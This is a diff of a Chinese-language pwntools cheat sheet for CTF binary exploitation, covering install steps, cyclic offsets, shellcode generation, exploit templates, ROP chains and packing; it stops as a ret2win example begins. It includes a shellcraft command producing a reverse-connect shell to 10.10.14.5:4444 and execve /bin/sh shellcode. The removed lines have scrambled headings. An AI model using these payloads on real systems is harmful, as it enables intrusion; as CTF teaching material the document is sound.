@@ -1,45 +1,48 @@
-# 🔍 pwntools 完整速查表
-
 <!-- language-home-navigation -->
-[🏠 中文首页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)
+[🏠 中文主页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)
 
-[🇹🇷 Türkçe Sürüm](./README.tr.md) • [🇬🇷 Ελληνικά](./README.el.md)
+[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)
 
-
-[pwntools](https://github.com/Gallopsled/pwntools) is a best-in-class CTF framework and exploit development library written in Python. Designed for rapid prototyping, binary exploitation (pwn), and reverse engineering, it provides a comprehensive suite of command-line tools (`pwn cyclic`, `pwn checksec`, `pwn asm`, `pwn shellcraft`) alongside a high-level Python API for interacting with local processes and remote sockets.
-
----
-
-## 📋 目录
-
-- [[ROP Chain Construction](#rop-chain-construction)](#core-capabilities)
-- [安装](#installation)
-- [Command-Line Utilities (`pwn <cmd>`)](#command-line-utilities-pwn-cmd)
-  - [` `pwn cyclic` (Buffer Offset Calculation)](#pwn-cyclic-buffer-offset-calculation)
-  - [` `pwn checksec` (Mitigation Inspection)](#pwn-checksec-mitigation-inspection)
-  - [` `pwn asm` & `pwn disasm` (Assembler / Disassembler)](#pwn-asm--pwn-disasm-assembler--disassembler)
-  - [` `pwn shellcraft` (Shellcode Generator)](#pwn-shellcraft-shellcode-generator)
-  - [` `pwn template` (Exploit Skeleton Generator)](#pwn-template-exploit-skeleton-generator)
-- [` pwn template` (Exploit Skeleton Generator)](#python-exploit-development-workflow)
-  - [Process & Remote Socket Connections](#process--remote-socket-connections)
-  - [ELF Parsing & Symbols](#elf-parsing--symbols)
-  - [ROP Chain Construction](#rop-chain-construction)
-  - [Packing & Endianness (`p32` / `p64`)](#packing--endianness-p32--p64)
-- [常用示例](#complete-exploit-example-buffer-overflow--ret2win)
+[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)
 
 ---
 
-## [ROP Chain Construction](#rop-chain-construction)
 
-- **Tubes Architecture**: Unified interface for interacting with local processes (`process`), remote TCP sockets (`remote`), and SSH sessions (`ssh`).
-- **Binary & Gadget Inspection**: Automated ELF symbol resolution, GOT/PLT lookup, and automated ROP chain synthesis.
-- **On-the-Fly Assembly**: Instant translation between assembly mnemonics and opcodes across x86, x86_64, ARM, MIPS, and AArch64.
-- **Shellcode Synthesis**: Pre-built, customizable shellcode templates for reverse shells, execve, file reading, and evasion.
+# pwntools 备忘单
+
+[pwntools](https://github.com/Gallopsled/pwntools) 是一个用 Python 编写的一流的 CTF 框架和漏洞利用开发库。它专为快速原型设计、二进制利用 (pwn) 和逆向工程而设计，提供了一套全面的命令行工具（`pwn cyclic`、`pwn checksec`、`pwn asm`、`pwn shellcraft`）以及用于与本地进程和远程套接字交互的高级 Python API。
+
+ - -
+
+＃＃ 目录
+
+- [核心能力](#核心能力)
+- [安装](#安装)
+- [命令行实用程序 (`pwn <cmd>`)](#command-line-utilities-pwn-cmd)
+  - [`pwn cyclic`（缓冲区偏移计算）](#pwn-cycl-buffer-offset-calculation)
+  - [`pwn checksec`（缓解检查）](#pwn-checksec-mitigation-inspection)
+  - [`pwn asm` 和 `pwn disasm`（汇编器/反汇编器）](#pwn-asm--pwn-disasm-汇编器--反汇编器)
+  - [`pwn shellcraft`（Shellcode 生成器）](#pwn-shellcraft-shellcode-generator)
+  - [`pwn template`（利用骨架生成器）](#pwn-template-exploit-骨骼-生成器)
+- [Python 漏洞利用开发工作流程](#python-exploit-development-workflow)
+  - [进程和远程套接字连接](#process--remote-socket-connections)
+  - [ELF 解析和符号](#elf-parsing--symbols)
+  - [ROP链构建](#rop-chain-construction)
+  - [打包和字节顺序 (`p32` / `p64`)](#packing--endianness-p32--p64)
+- [完整的利用示例（缓冲区溢出 + ret2win）](#complete-exploit-example-buffer-overflow--ret2win)
 
 ---
 
-## 安装
+## 核心能力
 
+- **管道架构：** 用于与本地进程 (`process`)、远程 TCP 套接字 (`remote`) 和 SSH 会话 (`ssh`) 交互的统一接口。
+- **二进制和小工具检查：** 自动 ELF 符号解析、GOT/PLT 查找和自动 ROP 链合成。
+- **即时汇编：** 跨 x86、x86_64、ARM、MIPS 和 AArch64 的汇编助记符和操作码之间的即时转换。
+- **Shellcode 合成：** 预构建的、可定制的 shellcode 模板，用于反向 shell、execve、文件读取和规避。
+
+ - -
+
+＃＃ 安装
 ```bash
 # Ubuntu / Debian / Kali Linux
 sudo apt-get update && sudo apt-get install -y python3-pwntools
@@ -50,14 +53,12 @@ pip3 install pwntools
 # Verify command-line utilities
 pwn version
 ```
-
 ---
 
-## Command-Line Utilities (`pwn <cmd>`)
+## 命令行实用程序 (`pwn <cmd>`)
 
-### ` pwn cyclic` (Buffer Offset Calculation)
-Generate unique De Bruijn cyclic patterns to determine the exact crash offset (EIP / RIP overwrite):
-
+### `pwn cyclic`（缓冲区偏移计算）
+生成独特的 De Bruijn 循环模式以确定准确的崩溃偏移（EIP / RIP 覆盖）：
 ```bash
 # Generate a 200-byte unique pattern
 pwn cyclic 200
@@ -69,15 +70,13 @@ pwn cyclic -l 0x6161616c
 # 64-bit architecture cyclic pattern lookup
 pwn cyclic -l "faaa" -n 8
 ```
-
-### ` pwn checksec` (Mitigation Inspection)
-` pwn cyclic` (Buffer Offset Calculation)
+### `pwn checksec`（缓解检查）
+检查任何 ELF 可执行文件的安全缓解措施（Canary、NX、PIE、RELRO、ASLR）：
 ```bash
 pwn checksec /path/to/binary
 ```
-
-### ` pwn asm` & `pwn disasm` (Assembler / Disassembler)
-Assemble instructions into shellcode bytes directly from the terminal:
+### `pwn asm` 和 `pwn disasm`（汇编器/反汇编器）
+直接从终端将指令组装成 shellcode 字节：
 ```bash
 # Assemble x86 instructions to hex bytes
 pwn asm "xor eax, eax; push eax"
@@ -88,9 +87,8 @@ pwn asm -c amd64 "mov rax, 59; syscall" --format hex
 # Disassemble raw hex bytes back to assembly
 pwn disasm "31c050682f2f7368682f62696e89e3505389e1b00bcd80" -c i386
 ```
-
-### ` pwn shellcraft` (Shellcode Generator)
-Generate production-ready shellcode payloads directly to terminal stdout or binary files:
+### `pwn shellcraft`（Shellcode 生成器）
+直接将生产就绪的 shellcode 有效负载生成到终端 stdout 或二进制文件：
 ```bash
 # Generate Linux x64 execve /bin/sh shellcode in hex
 pwn shellcraft amd64.linux.sh --format hex
@@ -101,18 +99,16 @@ pwn shellcraft amd64.linux.connect 10.10.14.5 4444
 # Output pure raw bytes directly into a file
 pwn shellcraft amd64.linux.sh --format raw > shellcode.bin
 ```
-
-### ` pwn template` (Exploit Skeleton Generator)
-Generate a battle-tested Python exploit template for a target binary and remote server:
+### `pwn template`（利用骨架生成器）
+为目标二进制文件和远程服务器生成经过实战测试的 Python 漏洞利用模板：
 ```bash
 pwn template ./vuln_binary --host 10.10.10.100 --port 1337 > exploit.py
 ```
-
 ---
 
-## ` pwn template` (Exploit Skeleton Generator)
+## Python 漏洞利用开发工作流程
 
-### Process & Remote Socket Connections
+### 进程和远程套接字连接
 ```python
 from pwn import *
 
@@ -133,18 +129,16 @@ io.sendline(b'Alice')
 # Switch to interactive shell once exploit succeeds
 io.interactive()
 ```
-
-### ELF Parsing & Symbols
-Python Exploit Development Workflow
+### ELF 解析和符号
+自动读取函数地址、GOT 和 PLT 表，无需手动 GDB 查找：
 ```python
 elf = ELF('./vuln_binary')
 print(f"Target function address: {hex(elf.symbols['win'])}")
 print(f"puts() PLT address: {hex(elf.plt['puts'])}")
 print(f"puts() GOT address: {hex(elf.got['puts'])}")
 ```
-
-### ROP Chain Construction
-Build Return-Oriented Programming (ROP) chains automatically:
+### ROP链构建
+自动构建面向返回编程（ROP）链：
 ```python
 elf = ELF('./vuln_binary')
 rop = ROP(elf)
@@ -155,9 +149,8 @@ print(rop.dump())
 
 payload = b"A" * 40 + rop.chain()
 ```
-
-### Packing & Endianness (`p32` / `p64`)
-Convert integer memory addresses into little-endian bytes:
+### 打包和字节顺序 (`p32` / `p64`)
+将整数内存地址转换为小端字节：
 ```python
 # 32-bit little-endian packing
 address_32 = p32(0x080484b6)  # Returns b'\xb6\x84\x04\x08'
@@ -168,11 +161,9 @@ address_64 = p64(0x0000000000401156)
 # Unpacking bytes to integer
 val = u64(b"\x56\x11\x40\x00\x00\x00\x00\x00")
 ```
-
 ---
 
-## 常用示例
-
+## 完整的利用示例（缓冲区溢出 + ret2win）
 ```python
 #!/usr/bin/env python3
 from pwn import *
